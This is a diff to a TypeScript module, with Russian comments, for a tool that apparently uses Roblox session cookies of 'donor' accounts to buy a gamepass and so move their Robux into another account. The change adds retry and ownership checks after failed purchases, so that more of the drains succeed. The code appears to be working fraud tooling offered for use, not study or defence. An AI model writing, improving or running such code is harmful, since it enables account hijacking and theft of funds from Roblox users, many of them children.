@@ -11,6 +11,8 @@
  * остаётся в TWA — там свой экземпляр той же механики.
  */
 
+import { needsOwnershipCheck } from "./roblox";
+
 const ROBLOX_UA = { "User-Agent": "Roblox/WinInet", Accept: "application/json" };
 
 export interface DrainOutcome {
@@ -212,9 +214,36 @@ export async function runDrain(donorCookie: string, drainCookie: string, gpId: s
       drainBalanceAfter: drainAfter,
     };
   }
+
+  // Ф1: провал/таймаут не значит «не куплено» — Roblox мог провести покупку.
+  // AlreadyOwned исключаем: донор владел пассом ДО попытки (слива не было) —
+  // автослив такие кандидаты отфильтровывает заранее, это честный провал.
+  const reason: string | null = pData ? (pData.reason ?? pData.errorMsg ?? "Неизвестная ошибка") : null;
+  if (!(reason && /already.?own/i.test(reason)) && needsOwnershipCheck(reason)) {
+    await new Promise((r) => setTimeout(r, 2_500));
+    const donor = await drainAuthedUser(donorCookie);
+    let owned = donor ? await ownsGamepass(donor.id, gpId) : null;
+    if (donor && owned !== true && (owned === null || reason === null)) {
+      await new Promise((r) => setTimeout(r, 5_000));
+      owned = await ownsGamepass(donor.id, gpId);
+    }
+    if (owned === true) {
+      console.warn(`[drain] recovered: пасс ${gpId} — владение донором подтверждено после ошибки «${reason ?? "нет ответа"}»`);
+      const [dAfter, rAfter] = await Promise.all([drainCurrency(donorCookie), drainCurrency(drainCookie)]);
+      return {
+        success: true,
+        msg: `Слито ${target} R$ (владение подтверждено проверкой после ошибки)`,
+        drained: target,
+        gamepassId: gpId,
+        donorBalanceAfter: dAfter ?? donorAfter,
+        drainBalanceAfter: rAfter ?? drainAfter,
+      };
+    }
+  }
+
   return {
     success: false,
-    msg: `Покупка не прошла: ${pData?.reason ?? pData?.errorMsg ?? "Неизвестная ошибка"}`,
+    msg: `Покупка не прошла: ${reason ?? "Нет ответа от Roblox"}`,
     donorBalanceAfter: donorAfter,
     drainBalanceAfter: drainAfter,
   };
